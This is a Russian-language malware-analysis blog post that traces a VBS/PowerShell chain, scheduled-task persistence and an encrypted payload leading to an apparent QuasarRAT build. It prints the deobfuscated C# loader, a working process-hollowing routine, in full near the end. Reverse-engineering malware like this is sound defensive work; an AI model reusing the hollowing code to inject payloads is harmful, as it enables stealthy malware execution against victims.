<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Простенький реверс малвари  · 
</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.1/build/grids-responsive-old-ie-min.css">
    <![endif]-->
    <!--[if gt IE 8]><!-->
         <link rel="stylesheet" href="https://unpkg.com/purecss@1.0.1/build/grids-responsive-min.css">
    <!--<![endif]--> 


    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@500&family=Fira+Sans+Condensed&family=Cantarell&family=Noto+Sans:wght@300&family=Noto+Sans+Display:wght@200&display=swap" rel="stylesheet">


    <link href="/theme/css/prism.css" rel="stylesheet" />
        <link href="/theme/style.min.css?85c516a7" rel="stylesheet">

    <link rel="shortcut icon" href="/images/favicon.ico"/>

    <!-- <script src="https://hypothes.is/embed.js" async></script> -->


 </head>

<body>
    <script src="/theme/css/prism.js"></script>
<div id="layout" class="pure-g">

<div class="sidebar pure-u-1 pure-u-md-5-24">
    <nav id="sidebar">
      <div class="sidebar-header">
<div class="sitename"><a href="/">Reversing blog by weka</a></div>
<div><small></small></div>
<div>
  <small>
    <a href="/">Статьи</a>
    &nbsp;&nbsp;|&nbsp;&nbsp;
    <a href="/categories">Категории</a>
    &nbsp;&nbsp;|&nbsp;&nbsp;
    <a href="/tags">Тэги</a>
    &nbsp;&nbsp;|&nbsp;&nbsp;
    <a href="/archives">Архив записей</a>
  </small>
</div>
<br>      </div>
      <div class="sidebar-content">
        <div class="toc"><div class="uppercase">Простенький реверс малвари</div>
<br>
<div class="col-lg-3 hidden-xs hidden-sm">
    <div id="toc"><ul><li><a class="toc-href" href="#" title="&Pcy;&rcy;&ocy;&scy;&tcy;&iecy;&ncy;&softcy;&kcy;&icy;&jcy; &rcy;&iecy;&vcy;&iecy;&rcy;&scy; &mcy;&acy;&lcy;&vcy;&acy;&rcy;&icy;">&Pcy;&rcy;&ocy;&scy;&tcy;&iecy;&ncy;&softcy;&kcy;&icy;&jcy; &rcy;&iecy;&vcy;&iecy;&rcy;&scy; &mcy;&acy;&lcy;&vcy;&acy;&rcy;&icy;</a><ul><li><a class="toc-href" href="#s-kem-imeiu-chest" title="&gt; &Scy; &kcy;&iecy;&mcy; &icy;&mcy;&iecy;&yucy; &chcy;&iecy;&scy;&tcy;&softcy;?">&gt; &Scy; &kcy;&iecy;&mcy; &icy;&mcy;&iecy;&yucy; &chcy;&iecy;&scy;&tcy;&softcy;?</a></li><li><a class="toc-href" href="#poverkhnostnyi-analiz" title="&gt; &Pcy;&ocy;&vcy;&iecy;&rcy;&khcy;&ncy;&ocy;&scy;&tcy;&ncy;&ycy;&jcy; &acy;&ncy;&acy;&lcy;&icy;&zcy;">&gt; &Pcy;&ocy;&vcy;&iecy;&rcy;&khcy;&ncy;&ocy;&scy;&tcy;&ncy;&ycy;&jcy; &acy;&ncy;&acy;&lcy;&icy;&zcy;</a></li><li><a class="toc-href" href="#masteejvbs-i-masteejps1" title="&gt; masteej.vbs &icy; masteej.ps1">&gt; masteej.vbs &icy; masteej.ps1</a></li><li><a class="toc-href" href="#jsdufsuygyftafvbs-i-reportps1" title="&gt; jsdufsuygyftaf.vbs &icy; Report.ps1">&gt; jsdufsuygyftaf.vbs &icy; Report.ps1</a></li><li><a class="toc-href" href="#nebolshoi-revers-dll" title="&gt; &Ncy;&iecy;&bcy;&ocy;&lcy;&softcy;&shcy;&ocy;&jcy; &rcy;&iecy;&vcy;&iecy;&rcy;&scy; dll">&gt; &Ncy;&iecy;&bcy;&ocy;&lcy;&softcy;&shcy;&ocy;&jcy; &rcy;&iecy;&vcy;&iecy;&rcy;&scy; dll</a></li><li><a class="toc-href" href="#vmesto-zakliucheniia" title="&gt; &Vcy;&mcy;&iecy;&scy;&tcy;&ocy; &zcy;&acy;&kcy;&lcy;&yucy;&chcy;&iecy;&ncy;&icy;&yacy;">&gt; &Vcy;&mcy;&iecy;&scy;&tcy;&ocy; &zcy;&acy;&kcy;&lcy;&yucy;&chcy;&iecy;&ncy;&icy;&yacy;</a></li></ul></li></ul></div>
</div>
</div>
      </div>
      <!-- <div id="footer"><small>Powered by <a href="http://getpelican.com/">Pelican</a> and <a href="https://github.com/out-of-cheese-error/astrochelys">Astrochelys</a></small></div> -->
    </nav>
</div>

<nav class="phone-header">
<div class="sitename"><a href="/">Reversing blog by weka</a></div>
<div><small></small></div>
<div>
  <small>
    <a href="/">Статьи</a>
    &nbsp;&nbsp;|&nbsp;&nbsp;
    <a href="/categories">Категории</a>
    &nbsp;&nbsp;|&nbsp;&nbsp;
    <a href="/tags">Тэги</a>
    &nbsp;&nbsp;|&nbsp;&nbsp;
    <a href="/archives">Архив записей</a>
  </small>
</div>
<br></nav>

       <div class="content pure-u-1 pure-u-md-1-2" >
           <article style="width: 100%">
<section id="content" class="body">
    <div class="marginnote">
      <hr>
      <div class="article-information">
        <div class="article-information-heading uppercase">Опубликовано</div>
        <time class="published" datetime="2023-06-13T00:00:00+05:00">
          Вт 13 Июнь 2023
        </time>
        <div class="article-information-heading uppercase">Категория</div>
        <div>
          <a href="/categories#PowerShell Protection & Reversing-ref" class="article-information-custom">&nbsp;PowerShell Protection & Reversing&nbsp;</a>
        </div>
        <div class="article-information-heading uppercase">Тэги</div>
        <div>
          <a href="/tags#powershell-ref" class="article-information-custom">&nbsp;powershell&nbsp;</a>
          <a href="/tags#reversing-ref" class="article-information-custom">&nbsp;reversing&nbsp;</a>
          <a href="/tags#malware-ref" class="article-information-custom">&nbsp;malware&nbsp;</a>
        </div>
        </div>
      <hr>
    </div>
    <header><a href="/reveresing-malware.html" rel="bookmark" title="Permalink to Простенький реверс малвари">
      <h1 class="article-title">
        Простенький реверс малвари
      </h1>
      <h3>
      </h3>
      <hr>
    </a></header>
    <div class="article-content">
      <h2 id="s-kem-imeiu-chest"><p class="colored-text-1" style="font-size: 32px;">&gt;</p> &Scy; &kcy;&iecy;&mcy; &icy;&mcy;&iecy;&yucy; &chcy;&iecy;&scy;&tcy;&softcy;?</h2>
<p>&Ocy;&tcy;&kcy;&ucy;&dcy;&acy; &bcy;&ycy;&lcy; &vcy;&zcy;&yacy;&tcy; &ecy;&tcy;&ocy;&tcy; &scy;&kcy;&rcy;&icy;&pcy;&tcy;, &yacy;&vcy;&lcy;&yacy;&iecy;&tcy;&scy;&yacy; &lcy;&icy; &ocy;&ncy; &chcy;&acy;&scy;&tcy;&softcy; &chcy;&iecy;&gcy;&ocy;-&tcy;&ocy; &bcy;&ocy;&lcy;&softcy;&shcy;&iecy;&gcy;&ocy;, &icy;&lcy;&icy; &zhcy;&iecy; &scy;&ucy;&shchcy;&iecy;&scy;&tcy;&vcy;&ucy;&iecy;&tcy; &scy;&acy;&mcy; &pcy;&ocy; &scy;&iecy;&bcy;&iecy; &ndash; &ncy;&iecy;&icy;&zcy;&vcy;&iecy;&scy;&tcy;&ncy;&ocy;, &ncy;&acy;&jcy;&dcy;&iecy;&ncy; &ocy;&ncy; &bcy;&ycy;&lcy; &ncy;&acy; &pcy;&rcy;&ocy;&scy;&tcy;&ocy;&rcy;&acy;&khcy; &icy;&ncy;&tcy;&iecy;&rcy;&ncy;&iecy;&tcy;&acy;. &Icy;&tcy;&acy;&kcy;, &dcy;&acy;&vcy;&acy;&jcy;&tcy;&iecy;, &ncy;&acy;&kcy;&ocy;&ncy;&iecy;&tscy;, &zcy;&acy;&gcy;&lcy;&yacy;&ncy;&iecy;&mcy; &vcy;&ncy;&ucy;&tcy;&rcy;&softcy;, &chcy;&tcy;&ocy; &mcy;&ycy; &icy;&mcy;&iecy;&iecy;&mcy;:</p>
<div style="padding-bottom: 10px; text-align: center; display: flex">
<div style="float:left; padding-right: 7px">
<a href="/images/reveresing-malware/1.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/1.PNG"/></a>
<br/><p class="light-dark-text" style="font-size: 16px;">&Ncy;&acy;&chcy;&acy;&lcy;&ocy; &scy;&kcy;&rcy;&icy;&pcy;&tcy;&acy;</p>
</div>
<div style="float:right; padding-left: 7px">
<a href="/images/reveresing-malware/2.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/2.PNG"/></a>
<br/><p class="light-dark-text" style="font-size: 16px;">&Kcy;&ocy;&ncy;&iecy;&tscy; &scy;&kcy;&rcy;&icy;&pcy;&tcy;&acy;</p>
</div>
</div>
<p>&Tcy;&acy;&kcy;&icy;&mcy; &ocy;&bcy;&rcy;&acy;&zcy;&ocy;&mcy;, &ucy; &ncy;&acy;&scy; &iecy;&scy;&tcy;&softcy; &ncy;&iecy;&bcy;&ocy;&lcy;&softcy;&shcy;&ocy;&jcy; &scy;&kcy;&rcy;&icy;&pcy;&tcy;, &vcy; &kcy;&ocy;&tcy;&ocy;&rcy;&ocy;&mcy; &zcy;&acy;&shcy;&icy;&tcy;&ocy; &chcy;&tcy;&ocy;-&tcy;&ocy; &iecy;&shchcy;&iocy;, &ecy;&tcy;&acy;&kcy;&icy;&jcy; &pcy;&rcy;&iecy;&zcy;&iecy;&ncy;&tcy;. &Pcy;&rcy;&iecy;&dcy;&lcy;&acy;&gcy;&acy;&yucy; &scy;&ncy;&acy;&chcy;&acy;&lcy;&acy; &rcy;&acy;&zcy;&ocy;&bcy;&rcy;&acy;&tcy;&softcy; &pcy;&ocy;&ncy;&yacy;&tcy;&ncy;&ycy;&iecy; &chcy;&acy;&scy;&tcy;&icy; &kcy;&ocy;&dcy;&acy;, &acy; &pcy;&ocy;&tcy;&ocy;&mcy; &pcy;&iecy;&rcy;&iecy;&khcy;&ocy;&dcy;&icy;&tcy;&softcy; &kcy; &rcy;&acy;&scy;&shcy;&icy;&fcy;&rcy;&ocy;&vcy;&kcy;&iecy;. &Kcy;&acy;&kcy; &gcy;&ocy;&vcy;&ocy;&rcy;&icy;&tcy;&scy;&yacy;, <em>&laquo;&Lcy;&ucy;&chcy;&shcy;&iecy; &scy;&icy;&ncy;&icy;&tscy;&acy; &vcy; &rcy;&ucy;&kcy;&acy;&khcy;, &chcy;&iecy;&mcy; &zhcy;&ucy;&rcy;&acy;&vcy;&lcy;&softcy; &vcy; &ncy;&iecy;&bcy;&iecy;&raquo;</em>.</p>
<h2 id="poverkhnostnyi-analiz"><p class="colored-text-1" style="font-size: 32px;">&gt;</p> &Pcy;&ocy;&vcy;&iecy;&rcy;&khcy;&ncy;&ocy;&scy;&tcy;&ncy;&ycy;&jcy; &acy;&ncy;&acy;&lcy;&icy;&zcy;</h2>
<p>&Icy;&tcy;&acy;&kcy;, &vcy;&ocy;&tcy;, &chcy;&tcy;&ocy; &mcy;&ycy; &mcy;&ocy;&zhcy;&iecy;&mcy; &zcy;&acy;&kcy;&lcy;&yucy;&chcy;&icy;&tcy;&softcy;, &bcy;&iecy;&gcy;&lcy;&ocy; &vcy;&zcy;&gcy;&lcy;&yacy;&ncy;&ucy;&vcy; &ncy;&acy; &ncy;&acy;&shcy; &scy;&kcy;&rcy;&icy;&pcy;&tcy;:</p>
<ul>
<li>&Pcy;&icy;&shcy;&iecy;&mcy; <code>jsdufsuygyftaf.vbs</code>, &kcy;&ocy;&tcy;&ocy;&rcy;&ycy;&jcy; &zcy;&acy;&pcy;&ucy;&scy;&kcy;&acy;&iecy;&tcy; &scy;&kcy;&rcy;&icy;&pcy;&tcy; <code>Report.ps1</code></li>
<li>&Pcy;&icy;&shcy;&iecy;&mcy; <code>masteej.vbs</code>, &kcy;&ocy;&tcy;&ocy;&rcy;&ycy;&jcy; &zcy;&acy;&pcy;&ucy;&scy;&kcy;&acy;&iecy;&tcy; &scy;&kcy;&rcy;&icy;&pcy;&tcy; <code>masteej.ps1</code></li>
<li>&Pcy;&icy;&shcy;&iecy;&mcy; <code>Report.ps1</code>, &kcy;&ocy;&tcy;&ocy;&rcy;&ycy;&jcy; &scy;&ocy;&dcy;&iecy;&rcy;&zhcy;&icy;&tcy; &vcy; &scy;&iecy;&bcy;&iecy; &zcy;&acy;&shcy;&icy;&fcy;&rcy;&ocy;&vcy;&acy;&ncy;&ncy;&ycy;&jcy; &pcy;&iecy;&jcy;&lcy;&ocy;&acy;&dcy;</li>
<li>&Pcy;&icy;&shcy;&iecy;&mcy; &zcy;&acy;&shcy;&icy;&fcy;&rcy;&ocy;&vcy;&acy;&ncy;&ncy;&ycy;&jcy; &ncy;&iecy;&bcy;&ocy;&lcy;&softcy;&shcy;&ocy;&jcy; <code>masteej.ps1</code></li>
<li>&ZHcy;&dcy;&iocy;&mcy; 6 &scy;&iecy;&kcy;&ucy;&ncy;&dcy; &icy; &zcy;&acy;&pcy;&ucy;&scy;&kcy;&acy;&iecy;&mcy; <code>masteej.vbs</code></li>
</ul>
<p>&Rcy;&acy;&zcy;&bcy;&ocy;&rcy; &ncy;&acy;&chcy;&ncy;&iocy;&mcy; &scy; &tcy;&ocy;&gcy;&ocy;, &chcy;&tcy;&ocy; &zcy;&acy;&pcy;&ucy;&scy;&kcy;&acy;&iecy;&tcy;&scy;&yacy; &ndash; &scy; <code>masteej.vbs</code> &icy; <code>masteej.ps1</code>.</p>
<h2 id="masteejvbs-i-masteejps1"><p class="colored-text-1" style="font-size: 32px;">&gt;</p> masteej.vbs &icy; masteej.ps1</h2>
<p>&Kcy;&acy;&kcy; &mcy;&ocy;&zhcy;&ncy;&ocy; &zcy;&acy;&mcy;&iecy;&tcy;&icy;&tcy;&softcy;, &zcy;&acy;&dcy;&acy;&chcy;&acy; <code>masteej.vbs</code> &pcy;&rcy;&ocy;&scy;&tcy;&acy; &dcy;&ocy;&ncy;&iecy;&lcy;&softcy;&zcy;&yacy;: &ocy;&ncy; &zcy;&acy;&pcy;&ucy;&scy;&kcy;&acy;&iecy;&tcy; <code>masteej.ps1</code>, &tcy;&ocy;&chcy;&ncy;&iecy;&iecy; &chcy;&icy;&tcy;&acy;&iecy;&tcy; &iecy;&gcy;&ocy; &scy;&ocy;&dcy;&iecy;&rcy;&zhcy;&icy;&mcy;&ocy;&iecy; &icy; &zcy;&acy;&pcy;&ucy;&scy;&kcy;&acy;&iecy;&tcy; &kcy;&acy;&kcy; &kcy;&ocy;&mcy;&acy;&ncy;&dcy;&ucy; PowerShell:</p>
<div style="text-align:center"><a href="/images/reveresing-malware/3.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/3.PNG"/></a><br/><p class="light-dark-text" style="font-size: 16px;">masteej.vbs</p></div>
<p>&Vcy;&tcy;&ocy;&rcy;&ocy;&jcy; &scy;&kcy;&rcy;&icy;&pcy;&tcy; &tcy;&ocy;&zhcy;&iecy; &chcy;&iecy;&mcy;-&tcy;&ocy; &vcy;&ycy;&dcy;&acy;&yucy;&shchcy;&icy;&mcy;&scy;&yacy; &ncy;&iecy; &yacy;&vcy;&lcy;&yacy;&iecy;&tcy;&scy;&yacy; &ndash; &ocy;&bcy;&ycy;&chcy;&ncy;&ocy;&iecy; &zcy;&acy;&kcy;&rcy;&iecy;&pcy;&lcy;&iecy;&ncy;&icy;&iecy; &vcy; &scy;&icy;&scy;&tcy;&iecy;&mcy;&iecy; &chcy;&iecy;&rcy;&iecy;&zcy; &Pcy;&lcy;&acy;&ncy;&icy;&rcy;&ocy;&vcy;&shchcy;&icy;&kcy; &zcy;&acy;&dcy;&acy;&ncy;&icy;&jcy;, &kcy;&ocy;&tcy;&ocy;&rcy;&ycy;&jcy; &ocy;&bcy;&iecy;&scy;&pcy;&iecy;&chcy;&icy;&vcy;&acy;&iecy;&tcy; &zcy;&acy;&pcy;&ucy;&scy;&kcy; <code>jsdufsuygyftaf.vbs</code> &kcy;&acy;&zhcy;&dcy;&ucy;&yucy; &mcy;&icy;&ncy;&ucy;&tcy;&ucy;:</p>
<div style="text-align:center"><a href="/images/reveresing-malware/4.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/4.PNG"/></a><br/><p class="light-dark-text" style="font-size: 16px;">masteej.ps1</p></div>
<p>&Pcy;&ocy;&scy;&lcy;&iecy; &tcy;&ocy;&gcy;&ocy;, &kcy;&acy;&kcy; &mcy;&acy;&lcy;&vcy;&acy;&rcy;&softcy; &zcy;&acy;&kcy;&rcy;&iecy;&pcy;&icy;&lcy;&acy;&scy;&softcy;, &ncy;&acy;&chcy;&icy;&ncy;&acy;&iecy;&tcy;&scy;&yacy; &zcy;&acy;&gcy;&rcy;&ucy;&zcy;&kcy;&acy; &scy;&acy;&mcy;&ocy;&gcy;&ocy; &pcy;&iecy;&jcy;&lcy;&ocy;&acy;&dcy;&acy;, &dcy;&acy;&vcy;&acy;&jcy;&tcy;&iecy; &kcy; &ncy;&iecy;&mcy;&ucy; &icy; &pcy;&iecy;&rcy;&iecy;&jcy;&dcy;&iocy;&mcy;.</p>
<h2 id="jsdufsuygyftafvbs-i-reportps1"><p class="colored-text-1" style="font-size: 32px;">&gt;</p> jsdufsuygyftaf.vbs &icy; Report.ps1</h2>
<p>VBS &scy;&kcy;&rcy;&icy;&pcy;&tcy; &scy;&lcy;&ucy;&zhcy;&icy;&tcy; &zcy;&acy;&pcy;&ucy;&scy;&kcy;&ocy;&mcy; &kcy;&ocy;&dcy;&acy; &icy;&zcy; <code>Report.ps1</code>. &CHcy;&tcy;&ocy;-&tcy;&ocy; &pcy;&ocy;&khcy;&ocy;&zhcy;&iecy;&iecy; &mcy;&ycy; &ucy;&zhcy;&iecy; &vcy;&icy;&dcy;&iecy;&lcy;&icy;:</p>
<div style="text-align:center"><a href="/images/reveresing-malware/5.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/5.PNG"/></a><br/><p class="light-dark-text" style="font-size: 16px;">jsdufsuygyftaf.vbs</p></div>
<p>PS &scy;&kcy;&rcy;&icy;&pcy;&tcy; &scy;&ocy;&dcy;&iecy;&rcy;&zhcy;&icy;&tcy; &zcy;&acy;&shcy;&icy;&fcy;&rcy;&ocy;&vcy;&acy;&ncy;&ncy;&ycy;&iecy; &dcy;&acy;&ncy;&ncy;&ycy;&iecy;:</p>
<div style="text-align:center"><a href="/images/reveresing-malware/6.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/6.PNG"/></a><br/><p class="light-dark-text" style="font-size: 16px;">jsdufsuygyftaf.vbs</p></div>
<p>&Vcy;&mcy;&iecy;&scy;&tcy;&ocy; &rcy;&ucy;&chcy;&ncy;&ocy;&jcy; &rcy;&acy;&scy;&shcy;&icy;&fcy;&rcy;&ocy;&vcy;&kcy;&icy; &pcy;&rcy;&ocy;&scy;&tcy;&ocy; &zcy;&acy;&pcy;&icy;&shcy;&iecy;&mcy; &vcy;&scy;&iecy; &bcy;&acy;&jcy;&tcy;&ycy; &vcy; &fcy;&acy;&jcy;&lcy;&ycy;, &ucy;&bcy;&rcy;&acy;&vcy; &icy;&zcy; &scy;&kcy;&rcy;&icy;&pcy;&tcy;&acy; &zcy;&acy;&pcy;&ucy;&scy;&kcy;:</p>
<div style="text-align:center"><a href="/images/reveresing-malware/7.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/7.PNG"/></a><br/><p class="light-dark-text" style="font-size: 16px;">&Mcy;&ocy;&dcy;&icy;&fcy;&icy;&tscy;&icy;&rcy;&ocy;&vcy;&acy;&ncy;&ncy;&ycy;&jcy; &kcy;&ocy;&dcy; Report.ps1</p></div>
<p>&Pcy;&ocy;&lcy;&ucy;&chcy;&acy;&iecy;&mcy; &dcy;&vcy;&acy; &fcy;&acy;&jcy;&lcy;&acy;, &ocy;&bcy;&acy; &yacy;&vcy;&lcy;&yacy;&yucy;&tcy;&scy;&yacy; &scy;&bcy;&ocy;&rcy;&kcy;&acy;&mcy;&icy; C#. &Zcy;&acy;&lcy;&icy;&vcy;&acy;&iecy;&mcy; &icy;&khcy; &ncy;&acy; VT.</p>
<p>&Ocy;&dcy;&icy;&ncy; &icy;&zcy; &fcy;&acy;&jcy;&lcy;&ocy;&vcy;, &ocy;&ncy; &zhcy;&iecy; <code>Client.exe</code>, &scy;&ucy;&dcy;&yacy; &pcy;&ocy; VT, &yacy;&vcy;&lcy;&yacy;&iecy;&tcy;&scy;&yacy; &bcy;&icy;&lcy;&dcy;&ocy;&mcy; QuazarRAT. &Vcy; &kcy;&ocy;&mcy;&mcy;&iecy;&ncy;&tcy;&acy;&rcy;&icy;&yacy;&khcy; &dcy;&acy;&zhcy;&iecy; &khcy;&ocy;&scy;&tcy; &mcy;&ocy;&zhcy;&ncy;&ocy; &ocy;&bcy;&ncy;&acy;&rcy;&ucy;&zhcy;&icy;&tcy;&softcy;:</p>
<div style="text-align:center"><a href="/images/reveresing-malware/8.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/8.PNG"/></a><br/><p class="light-dark-text" style="font-size: 16px;">&Kcy;&ocy;&mcy;&mcy;&iecy;&ncy;&tcy;&acy;&rcy;&icy;&jcy; &scy; &khcy;&ocy;&scy;&tcy;&ocy;&mcy;</p></div>
<p>&Rcy;&acy;&zcy; &ucy;&zhcy; &vcy;&scy;&iecy;, &kcy;&tcy;&ocy; &mcy;&ocy;&zhcy;&ncy;&ocy;, &vcy; &ncy;&iocy;&mcy; &ucy;&zhcy;&iecy; &pcy;&ocy;&kcy;&ocy;&pcy;&acy;&lcy;&icy;&scy;&softcy;, &tcy;&ocy; &kcy;&ocy;&vcy;&ycy;&rcy;&yacy;&tcy;&softcy;&scy;&yacy; &vcy; &ncy;&iocy;&mcy; &ncy;&iecy; &bcy;&ucy;&dcy;&iecy;&mcy;. &Vcy;&tcy;&ocy;&rcy;&ocy;&jcy; &zhcy;&iecy; &fcy;&acy;&jcy;&lcy;&icy;&kcy;, &chcy;&tcy;&ocy; &pcy;&ocy;&mcy;&iecy;&ncy;&softcy;&shcy;&iecy;, &yacy;&vcy;&lcy;&yacy;&iecy;&tcy;&scy;&yacy; dll&rsquo;&kcy;&ocy;&jcy; &icy; &pcy;&ocy; &ncy;&iecy;&mcy;&ucy; &chcy;&iecy;&gcy;&ocy;-&tcy;&ocy; &vcy;&ncy;&yacy;&tcy;&ncy;&ocy;&gcy;&ocy; VT &scy;&kcy;&acy;&zcy;&acy;&tcy;&softcy; &ncy;&iecy; &mcy;&ocy;&zhcy;&iecy;&tcy;, &pcy;&ocy;&ecy;&tcy;&ocy;&mcy;&ucy; &iecy;&gcy;&ocy; &mcy;&ocy;&zhcy;&ncy;&ocy; &pcy;&ocy;&kcy;&ocy;&vcy;&ycy;&rcy;&yacy;&tcy;&softcy; &mcy;&ocy;&zhcy;&ncy;&ocy;.</p>
<h2 id="nebolshoi-revers-dll"><p class="colored-text-1" style="font-size: 32px;">&gt;</p> &Ncy;&iecy;&bcy;&ocy;&lcy;&softcy;&shcy;&ocy;&jcy; &rcy;&iecy;&vcy;&iecy;&rcy;&scy; dll</h2>
<p>&Scy;&ucy;&dcy;&yacy; &pcy;&ocy; <code>Report.ps1</code>, &icy;&zcy; &ecy;&tcy;&ocy;&jcy; dll&rsquo;&kcy;&icy; &vcy;&ycy;&zcy;&ycy;&vcy;&acy;&iecy;&tcy;&scy;&yacy; &mcy;&iecy;&tcy;&ocy;&dcy; <code>PE.Execute(..., ...)</code>. &Ncy;&ucy;-&scy;, &ocy;&tcy;&kcy;&rcy;&ycy;&vcy;&acy;&iecy;&mcy;:</p>
<div style="text-align:center"><a href="/images/reveresing-malware/9.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/9.PNG"/></a><br/><p class="light-dark-text" style="font-size: 16px;">&Mcy;&iecy;&tcy;&ocy;&dcy; Execute (&kcy;&ocy;&ncy;&fcy;&ucy;&zhcy;&iecy;&ncy;&ncy;&ycy;&jcy;)</p></div>
<p>Looks like cfex.... &Ncy;&iecy; &pcy;&rcy;&ocy;&bcy;&lcy;&iecy;&mcy;&acy;, &scy;&ncy;&icy;&mcy;&acy;&iecy;&mcy; &pcy;&iecy;&rcy;&vcy;&ycy;&mcy; &pcy;&ocy;&pcy;&acy;&vcy;&shcy;&icy;&mcy;&scy;&yacy; &dcy;&iecy;&ocy;&bcy;&fcy;&ucy;&scy;&kcy;&acy;&tcy;&ocy;&rcy;&ocy;&mcy;:</p>
<div style="text-align:center"><a href="/images/reveresing-malware/10.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/10.PNG"/></a><br/><p class="light-dark-text" style="font-size: 16px;">&Mcy;&iecy;&tcy;&ocy;&dcy; Execute (&rcy;&acy;&scy;&kcy;&ocy;&ncy;&fcy;&ucy;&zhcy;&iecy;&ncy;&ncy;&ycy;&jcy;)</p></div>
<p>&Ocy;&scy;&tcy;&acy;&lcy;&ocy;&scy;&softcy; &scy;&ncy;&yacy;&tcy;&softcy; &scy;&tcy;&rcy;&ocy;&kcy;&icy;. &Bcy;&lcy;&acy;&gcy;&ocy;, &fcy;&ucy;&ncy;&kcy;&tscy;&icy;&yacy; &tcy;&ucy;&tcy; &ecy;&lcy;&iecy;&mcy;&iecy;&ncy;&tcy;&acy;&rcy;&ncy;&iecy;&jcy;&shcy;&acy;&yacy;, &mcy;&ocy;&zhcy;&ncy;&ocy; &scy;&ncy;&yacy;&tcy;&softcy; de4dot&rsquo;&ocy;&mcy;. &Pcy;&ocy;&lcy;&ucy;&chcy;&iecy;&ncy;&ncy;&ycy;&jcy; &kcy;&ocy;&dcy; &kcy;&acy;&kcy; &ncy;&acy; &lcy;&acy;&dcy;&ocy;&ncy;&icy;:</p>
<div style="text-align:center"><a href="/images/reveresing-malware/11.PNG"><img alt="a" class="img-resize" src="/images/reveresing-malware/11.PNG"/></a><br/><p class="light-dark-text" style="font-size: 16px;">&Mcy;&iecy;&tcy;&ocy;&dcy; Execute (&dcy;&iecy;&ocy;&bcy;&fcy;&ucy;&tscy;&icy;&rcy;&ocy;&vcy;&acy;&ncy;&ncy;&ycy;&jcy;)</p></div>
<p>&Ncy;&iecy;&mcy;&ncy;&ocy;&gcy;&ocy; &ucy;&pcy;&rcy;&ocy;&scy;&tcy;&icy;&mcy; &iecy;&gcy;&ocy; &dcy;&lcy;&yacy; &pcy;&ocy;&ncy;&icy;&mcy;&acy;&ncy;&icy;&yacy;, &vcy;&ocy;&tcy;, &chcy;&tcy;&ocy; &pcy;&ocy;&lcy;&ucy;&chcy;&icy;&tcy;&scy;&yacy;:</p>
<details class="spoiler">
<summary>📝 &Kcy;&ocy;&dcy; <p class="dark-text" style="font-size: 18px;">&nbsp;[&Scy;#]</p></summary>
<pre><code class="language-cs">public static void Execute(string path, byte[] payload)
{
    for (int i = 0; i &lt; 5; i++)
    {
        int num = 0;
        Func.StartupInformation startupInformation = default(Func.StartupInformation);
        Func.ProcessInformation processInformation = default(Func.ProcessInformation);
        startupInformation.Size = uint.Parse(Marshal.SizeOf(typeof(Func.StartupInformation)).ToString());
        try
        {
            if (!Native.CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 134217732U, IntPtr.Zero, null, ref startupInformation, ref processInformation))
            {
                throw new Exception();
            }
            int num2 = BitConverter.ToInt32(payload, 60);
            int num3 = BitConverter.ToInt32(payload, num2 + 52);
            int[] array = new int[179];
            array[0] = 65538;
            if (IntPtr.Size == 4)
            {
                if (!Native.GetThreadContext(processInformation.ThreadHandle, array))
                {
                    throw new Exception();
                }
            }
            else if (!Native.Wow64GetThreadContext(processInformation.ThreadHandle, array))
            {
                throw new Exception();
            }
            int num4 = array[41];
            int num5 = 0;
            if (!Native.ReadProcessMemory(processInformation.ProcessHandle, num4 + 8, ref num5, 4, ref num))
            {
                throw new Exception();
            }
            if (num3 == num5 &amp;&amp; Native.ZwUnmapViewOfSection(processInformation.ProcessHandle, num5) != 0)
            {
                throw new Exception();
            }
            int num6 = BitConverter.ToInt32(payload, num2 + 80);
            int num7 = BitConverter.ToInt32(payload, num2 + 84);
            bool flag = false;
            int num8 = Native.VirtualAllocEx(processInformation.ProcessHandle, num3, num6, 12288, 64);
            if (num8 == 0)
            {
                throw new Exception();
            }
            if (!Native.WriteProcessMemory(processInformation.ProcessHandle, num8, payload, num7, ref num))
            {
                throw new Exception();
            }
            int num9 = num2 + 248;
            short num10 = BitConverter.ToInt16(payload, num2 + 6);
            for (int j = 0; j &lt; (int)num10; j++)
            {
                int num11 = BitConverter.ToInt32(payload, num9 + 12);
                int num12 = BitConverter.ToInt32(payload, num9 + 16);
                int num13 = BitConverter.ToInt32(payload, num9 + 20);
                if (num12 != 0)
                {
                    byte[] array2 = new byte[num12];
                    Buffer.BlockCopy(payload, num13, array2, 0, array2.Length);
                    if (!Native.WriteProcessMemory(processInformation.ProcessHandle, num8 + num11, array2, array2.Length, ref num))
                    {
                        throw new Exception();
                    }
                }
                num9 += 40;
            }
            byte[] bytes = BitConverter.GetBytes(num8);
            if (!Native.WriteProcessMemory(processInformation.ProcessHandle, num4 + 8, bytes, 4, ref num))
            {
                throw new Exception();
            }
            int num14 = BitConverter.ToInt32(payload, num2 + 40);
            if (flag)
            {
                num8 = num3;
            }
            array[44] = num8 + num14;
            if (IntPtr.Size != 4)
            {
                if (!Native.Screenshot(processInformation.ThreadHandle, array))
                {
                    throw new Exception();
                }
            }
            else if (!Native.SetThreadContext(processInformation.ThreadHandle, array))
            {
                throw new Exception();
            }
            if ((int)Interaction.CallByName(Native.ResumeThread, "Invoke", CallType.Method, new object[] { processInformation.ThreadHandle }) != -1)
            {
                break;
            }
            throw new Exception();
        }
        catch
        {
            Process.GetProcessById(Convert.ToInt32(processInformation.ProcessId)).Kill();
        }
    }
}</code></pre>
</details>
